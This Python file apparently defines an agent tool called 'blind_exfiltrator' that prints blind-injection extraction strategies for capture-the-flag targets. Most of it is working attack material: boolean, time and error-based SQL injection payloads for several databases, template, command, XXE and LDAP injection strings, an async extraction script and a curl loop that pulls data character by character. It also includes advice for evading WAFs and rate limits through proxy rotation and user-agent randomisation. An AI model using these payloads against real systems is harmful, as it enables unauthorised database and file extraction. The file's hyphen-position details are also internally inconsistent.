"""Blind Exfiltrator - Optimized blind exploitation and data extraction."""

import time
import string
import math
from typing import Dict, List, Optional, Any
from strands import tool


@tool
def blind_exfiltrator(
    target_url: str,
    injection_point: str,
    extraction_type: str = "boolean",
    target_data: str = "flag",
    custom_payload: str = ""
) -> str:
    """
    Optimize blind exploitation for efficient flag extraction from SQLi, SSTI, XXE, etc.

    This tool provides strategies for boolean-based, time-based, and error-based
    blind extraction with binary search optimization.

    Args:
        target_url: The vulnerable endpoint
        injection_point: Parameter or header where injection occurs
        extraction_type: One of 'boolean', 'time', 'error', 'strategy'
        target_data: What to extract ('flag', 'database', 'file', 'custom')
        custom_payload: Optional custom extraction payload

    Returns:
        Optimized extraction strategy and commands

    Example:
        blind_exfiltrator("http://challenge.local/search", "q", "boolean", "flag")
    """

    output = []
    output.append("Blind Exfiltrator - Optimized Data Extraction")
    output.append("=" * 60)

    # Character sets for extraction
    charsets = {
        "hex": "0123456789abcdef",
        "alphanum": string.ascii_letters + string.digits,
        "ascii": string.ascii_letters + string.digits + "-_{}.!",
        "printable": string.printable.strip(),
        "flag_uuid": "0123456789abcdef-",  # For UUID flags
    }

    # Determine charset based on target
    if target_data == "flag":
        charset = charsets["flag_uuid"]
        expected_length = 36  # UUID length
    else:
        charset = charsets["hex"]
        expected_length = 32  # Default assumption

    # Phase 1: Extraction Strategy
    output.append(f"\nPhase 1: Extraction Strategy for {extraction_type}")
    output.append("-" * 40)

    if extraction_type == "strategy" or extraction_type not in ["boolean", "time", "error"]:
        # Provide overview of all strategies
        output.append("Available extraction methods:")
        output.append("\n1. Boolean-based (fastest if stable)")
        output.append("   - Binary search: O(log n) per character")
        output.append("   - Requires: Distinct true/false responses")
        output.append("\n2. Time-based (reliable but slow)")
        output.append("   - Uses delays to indicate true/false")
        output.append("   - Requires: Consistent network latency")
        output.append("\n3. Error-based (fast if errors differ)")
        output.append("   - Different errors for true/false")
        output.append("   - Requires: Verbose error messages")

    # Phase 2: Boolean-Based Extraction
    if extraction_type == "boolean":
        output.append("\nPhase 2: Boolean-Based Blind Extraction")
        output.append("-" * 40)

        # SQL Injection payloads
        if "sql" in injection_point.lower() or target_data in ["database", "table"]:
            output.append("SQL Injection Payloads:")

            # Length detection
            output.append("\n1. Detect flag length:")
            for length in [32, 36, 40, 64]:
                payload = f"' AND LENGTH((SELECT flag FROM flags LIMIT 1))={length}-- "
                output.append(f"   Test length={length}: {injection_point}={payload[:50]}...")

            # Binary search for characters
            output.append("\n2. Extract via binary search:")
            output.append("```python")
            output.append("def extract_char(pos):")
            output.append("    low, high = 0, 127")
            output.append("    while low <= high:")
            output.append("        mid = (low + high) // 2")
            output.append(f"        payload = \"' AND ASCII(SUBSTR((SELECT flag FROM flags),{{}},1))>{{}}- \"")
            output.append("        payload = payload.format(pos, mid)")
            output.append("        if send_request(payload):")
            output.append("            low = mid + 1")
            output.append("        else:")
            output.append("            high = mid - 1")
            output.append("    return chr(low)")
            output.append("```")

            # Optimization for UUID format
            output.append("\n3. UUID-optimized extraction:")
            output.append("   Known positions: 8-4-4-4-12 hex pattern")
            output.append("   Skip hyphens at positions: 9, 14, 19, 24")
            output.append("   Use hex charset only (0-9a-f)")

        # SSTI payloads
        elif "ssti" in injection_point.lower() or "template" in target_data.lower():
            output.append("SSTI Blind Payloads:")

            # Jinja2/Flask
            output.append("\nJinja2/Flask:")
            output.append("{{ config.FLAG[0:1] == 'f' }}")  # Check first char
            output.append("{{ config.FLAG[0:1] > 'a' }}")   # Binary search

            # Django
            output.append("\nDjango:")
            output.append("{% if flag.0 == 'f' %}true{% endif %}")

        # Command injection
        elif "cmd" in injection_point.lower() or "command" in target_data.lower():
            output.append("Command Injection Payloads:")
            output.append("\nLength detection:")
            output.append("$([ $(cat /flag.txt | wc -c) -eq 36 ] && sleep 2)")
            output.append("\nCharacter extraction:")
            output.append("$([ $(cat /flag.txt | cut -c1) = 'f' ] && sleep 2)")

    # Phase 3: Time-Based Extraction
    elif extraction_type == "time":
        output.append("\nPhase 3: Time-Based Blind Extraction")
        output.append("-" * 40)

        output.append("Optimization techniques:")
        output.append("1. Baseline measurement:")
        output.append("   - Send 10 requests without delay")
        output.append("   - Calculate average response time")
        output.append("   - Set threshold = baseline + delay/2")

        output.append("\n2. Adaptive delays:")
        output.append("   - Start with 2 second delay")
        output.append("   - Increase if network is slow")
        output.append("   - Decrease if responses are consistent")

        output.append("\n3. Parallel extraction:")
        output.append("   - Extract multiple positions simultaneously")
        output.append("   - Use different delay values per position")

        # SQL time-based
        output.append("\nSQL Time-based payloads:")
        output.append("MySQL: ' AND IF(SUBSTR(flag,1,1)='f',SLEEP(2),0)-- ")
        output.append("PostgreSQL: '; SELECT CASE WHEN (SUBSTR(flag,1,1)='f') THEN pg_sleep(2) END--")
        output.append("MSSQL: '; IF (SUBSTRING(flag,1,1)='f') WAITFOR DELAY '0:0:2'--")
        output.append("SQLite: ' AND CASE WHEN (SUBSTR(flag,1,1)='f') THEN (SELECT COUNT(*) FROM generate_series(1,20000000)) END--")

        # Optimization script
        output.append("\nOptimized extraction script:")
        output.append("```python")
        output.append("import asyncio")
        output.append("import aiohttp")
        output.append("")
        output.append("async def extract_position(session, pos, charset):")
        output.append("    for char in charset:")
        output.append("        delay = 2 + (pos % 3) * 0.5  # Vary delays")
        output.append(f"        payload = f\"' AND IF(SUBSTR(flag,{{pos}},1)='{{char}}',SLEEP({{delay}}),0)-- \"")
        output.append("        start = time.time()")
        output.append("        await session.get(url + payload)")
        output.append("        if time.time() - start > delay:")
        output.append("            return char")
        output.append("    return '?'")
        output.append("```")

    # Phase 4: Error-Based Extraction
    elif extraction_type == "error":
        output.append("\nPhase 4: Error-Based Extraction")
        output.append("-" * 40)

        output.append("Error differentiation techniques:")

        output.append("\nSQL Error-based:")
        output.append("MySQL: ' AND (SELECT CASE WHEN (SUBSTR(flag,1,1)='f') THEN 1 ELSE 1/0 END)-- ")
        output.append("PostgreSQL: ' AND (SELECT CASE WHEN (SUBSTR(flag,1,1)='f') THEN 1 ELSE 1/(1-1) END)--")

        output.append("\nXXE Error-based:")
        output.append('<!ENTITY % char1 SYSTEM "file:///flag.txt">')
        output.append('<!ENTITY % eval "<!ENTITY &#37; error SYSTEM \'file:///invalid/%char1;\'>">')

        output.append("\nLDAP Injection:")
        output.append("*)(&(uid=admin)(password=f*))")  # Wildcard matching

    # Phase 5: Binary Search Optimization
    output.append("\nPhase 5: Binary Search Optimization")
    output.append("-" * 40)

    charset_list = list(charset)
    charset_bits = math.ceil(math.log2(len(charset_list)))

    output.append(f"Charset: {charset[:20]}... ({len(charset)} chars)")
    output.append(f"Bits per character: {charset_bits}")
    output.append(f"Comparisons per char: ~{charset_bits} (vs {len(charset)} linear)")

    output.append("\nBinary search algorithm:")
    output.append("```python")
    output.append("def binary_search_char(position):")
    output.append(f"    charset = '{charset}'")
    output.append("    low, high = 0, len(charset) - 1")
    output.append("    ")
    output.append("    while low <= high:")
    output.append("        mid = (low + high) // 2")
    output.append("        # Test if char > charset[mid]")
    output.append(f"        if test_greater_than(position, charset[mid]):")
    output.append("            low = mid + 1")
    output.append("        else:")
    output.append("            high = mid - 1")
    output.append("    ")
    output.append("    return charset[low] if low < len(charset) else '?'")
    output.append("```")

    # Phase 6: Flag-Specific Optimizations
    if target_data == "flag":
        output.append("\nPhase 6: Flag-Specific Optimizations")
        output.append("-" * 40)

        output.append("UUID flag optimizations:")
        output.append("1. Known format: flag{8-4-4-4-12}")
        output.append("2. Skip positions: 5('{'), 14('-'), 19('-'), 24('-'), 29('-'), 42('}')")
        output.append("3. Validate segments: Each segment is valid hex")
        output.append("4. Parallel extraction: Extract each segment separately")

        output.append("\nCommon flag locations in database:")
        output.append("• Table: flags, flag, ctf, secret")
        output.append("• Column: flag, value, data, content, secret")
        output.append("• Common queries:")
        output.append("  - SELECT flag FROM flags")
        output.append("  - SELECT value FROM config WHERE key='flag'")
        output.append("  - SELECT * FROM users WHERE username='admin'")

    # Phase 7: Automation Script
    output.append("\nPhase 7: Complete Extraction Script")
    output.append("-" * 40)

    output.append("Bash one-liner for testing:")
    output.append(f"""
flag=""
for i in {{1..36}}; do
    for c in {' '.join(charset[:10])}; do
        response=$(curl -s "{target_url}?{injection_point}=' AND SUBSTR(flag,$i,1)='$c'-- ")
        if [[ $response == *"true"* ]]; then
            flag="${{flag}}${{c}}"
            echo "Position $i: $c (Current: $flag)"
            break
        fi
    done
done
echo "Extracted flag: $flag"
""".strip())

    # Phase 8: Troubleshooting
    output.append("\nPhase 8: Troubleshooting")
    output.append("-" * 40)

    output.append("Common issues and solutions:")
    output.append("1. Inconsistent responses:")
    output.append("   - Add delays between requests")
    output.append("   - Use connection pooling")
    output.append("   - Retry on timeout")

    output.append("\n2. WAF/Rate limiting:")
    output.append("   - Randomize user agents")
    output.append("   - Use proxy rotation")
    output.append("   - Add jitter to timing")

    output.append("\n3. Encoding issues:")
    output.append("   - Try hex encoding: HEX(flag)")
    output.append("   - Use base64: TO_BASE64(flag)")
    output.append("   - Cast to specific type: CAST(flag AS CHAR)")

    # CTF-specific tips
    output.append("\n💡 CTF Tips:")
    output.append("• If stuck, try extracting table/column names first")
    output.append("• Check for multiple flag storage locations")
    output.append("• Sometimes flag is in error messages themselves")
    output.append("• Consider out-of-band extraction (DNS, webhooks)")
    output.append("• Binary search saves significant time on long flags")

    return "\n".join(output)